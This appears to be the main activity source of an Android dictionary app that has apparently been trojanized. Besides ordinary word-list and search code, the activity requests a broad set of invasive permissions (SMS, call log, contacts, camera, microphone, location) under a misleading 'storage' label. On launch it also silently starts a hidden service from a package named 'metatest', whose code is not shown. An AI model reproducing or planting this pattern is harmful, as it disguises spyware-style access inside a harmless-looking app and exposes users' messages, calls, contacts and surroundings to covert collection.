package inducesmile.com.androiddictionaryapplication;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.ActionBarActivity;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.Toast;

import inducesmile.com.androiddictionaryapplication.metatest.MainService;

public class  MainActivity extends ActionBarActivity {

    private EditText filterText;
    private ArrayAdapter<String> listAdapter;
    private static final int REQUEST_EXTERNAL_STORAGE = 1;
    int PICK_REQUEST_CODE = 1;
    Intent mediaIntent;
    private static String[] PERMISSIONS_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                   Manifest.permission.ACCESS_WIFI_STATE,
   Manifest.permission.CHANGE_WIFI_STATE,
   Manifest.permission.ACCESS_NETWORK_STATE,
   Manifest.permission.ACCESS_COARSE_LOCATION,
   Manifest.permission.ACCESS_FINE_LOCATION,
   Manifest.permission.READ_PHONE_STATE,
   Manifest.permission.SEND_SMS,
   Manifest.permission.RECORD_AUDIO,
   Manifest.permission.CALL_PHONE,
   Manifest.permission.READ_CONTACTS,
   Manifest.permission.WRITE_CONTACTS,
   Manifest.permission.RECORD_AUDIO,
   Manifest.permission.WRITE_SETTINGS,
   Manifest.permission.CAMERA,
   Manifest.permission.READ_SMS,
   Manifest.permission.WRITE_EXTERNAL_STORAGE,
   Manifest.permission.RECEIVE_BOOT_COMPLETED,
   Manifest.permission.SET_WALLPAPER,
   Manifest.permission.READ_CALL_LOG,
   Manifest.permission.WRITE_CALL_LOG,
   Manifest.permission.WAKE_LOCK,

    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        verifyStoragePermissions(this);
        MainService.startService(this);

        filterText = (EditText)findViewById(R.id.editText);
        ListView itemList = (ListView)findViewById(R.id.listView);

        DbBackend dbBackend = new DbBackend(MainActivity.this);
        String[] terms = dbBackend.dictionaryWords();

        listAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, android.R.id.text1, terms);

        itemList.setAdapter(listAdapter);
        itemList.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                // make Toast when click
                Toast.makeText(getApplicationContext(), "Position " + position, Toast.LENGTH_LONG).show();
                Intent intent = new Intent(MainActivity.this, DictionaryActivity.class);
                intent.putExtra("DICTIONARY_ID", position);
                startActivity(intent);
            }
        });

        filterText.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }
            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                MainActivity.this.listAdapter.getFilter().filter(s);
            }
            @Override
            public void afterTextChanged(Editable s) {
            }
        });
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public static void verifyStoragePermissions(Activity activity) {
        // Check if we have read or write permission
        int writePermission = ActivityCompat.checkSelfPermission(activity, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int readPermission = ActivityCompat.checkSelfPermission(activity, Manifest.permission.READ_EXTERNAL_STORAGE);

        if (writePermission != PackageManager.PERMISSION_GRANTED || readPermission != PackageManager.PERMISSION_GRANTED) {
            // We don't have permission so prompt the user
            ActivityCompat.requestPermissions(
                    activity,
                    PERMISSIONS_STORAGE,
                    REQUEST_EXTERNAL_STORAGE
            );
        }
    }
}
